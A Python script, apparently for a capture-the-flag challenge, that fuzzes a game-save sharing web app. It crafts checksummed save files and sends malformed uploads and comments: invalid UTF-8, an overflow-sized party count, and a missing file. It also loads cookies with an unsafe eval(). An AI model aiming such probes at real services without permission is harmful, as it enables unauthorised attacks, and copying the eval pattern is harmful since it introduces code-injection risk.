import os, sys, struct, requests, re, urllib.parse
BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
OUT=open("artifacts/out.txt","w")
def log(*a):
    s=" ".join(str(x) for x in a); print(s); OUT.write(s+"\n")
def g(label,r,limit=1500):
    log("--",label,r.status_code,"len",len(r.content))
    log(r.text[:limit])
s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
try:
    for k,v in eval(open("artifacts/cookie.txt").read()).items(): s.cookies.set(k,v)
    log("cookie loaded")
except Exception as e: log("cookie err",e)
def checksum(data):
    t=0
    for i in range(0,len(data)-len(data)%4,4): t=(t+struct.unpack_from('<I',data,i)[0])&0xFFFFFFFF
    return ((t&0xFFFF)+(t>>16))&0xFFFF
SIZES={0:3884,1:3968,2:3968,3:3968,4:3848,5:3968,6:3968,7:3968,8:3968,9:3968,10:3968,11:3968,12:3968,13:2000}
def make_save(party_count=1, section_id=0, extra=b''):
    buf=bytearray(0x20000)
    def sec(base,idx,counter,data):
        sc=bytearray(0x1000); sc[0:len(data)]=data
        struct.pack_into('<H',sc,0xFF4,idx); struct.pack_into('<H',sc,0xFF6,checksum(sc[0:SIZES.get(idx,3968)]))
        struct.pack_into('<I',sc,0xFF8,0x08012025); struct.pack_into('<I',sc,0xFFC,counter)
        buf[base+idx*0x1000:base+(idx+1)*0x1000]=sc
    s0=bytearray(SIZES[0]); struct.pack_into('<I',s0,0x0A,12345); sec(0,0,100,s0)
    s1=bytearray(SIZES[1]); struct.pack_into('<I',s1,0x234,party_count); sec(0,1,100,s1)
    for i in range(2,14): sec(0,i,100,bytes(SIZES[i]))
    for i in range(14): sec(0xE000,i,50,bytes(SIZES[i]))
    return bytes(buf)+extra
sv=make_save(1)
# invalid utf8 title
r=s.post(BASE+"/boxes",data={"title":b"bad\xff\xfe","description":b"d\xff"},files={'save':('a.sav',sv)},timeout=30,allow_redirects=False)
g("invalid utf8 title",r)
loc=r.headers.get('location')
if loc: g("box", s.get(loc,timeout=20))
# invalid utf8 comment
r=s.post(BASE+"/box/1/comment",data={"body":b"c\xff\xfe"},timeout=20,allow_redirects=False); g("invalid utf8 comment",r)
g("box1", s.get(BASE+"/box/1",timeout=20))
# huge party count
sv2=make_save(0xFFFFFFFF)
r=s.post(BASE+"/boxes",data={"title":"huge party","description":"x"},files={'save':('b.sav',sv2)},timeout=30,allow_redirects=False); g("huge party upload",r)
if r.headers.get('location'): g("huge party box", s.get(r.headers['location'],timeout=20))
# section id weird
sv3=make_save(1, section_id=0xFFFF)
r=s.post(BASE+"/boxes",data={"title":"weird sect","description":"x"},files={'save':('c.sav',sv3)},timeout=30,allow_redirects=False); g("weird section upload",r)
# no file
r=s.post(BASE+"/boxes",data={"title":"nofile"},timeout=20,allow_redirects=False); g("no file",r)
OUT.close()
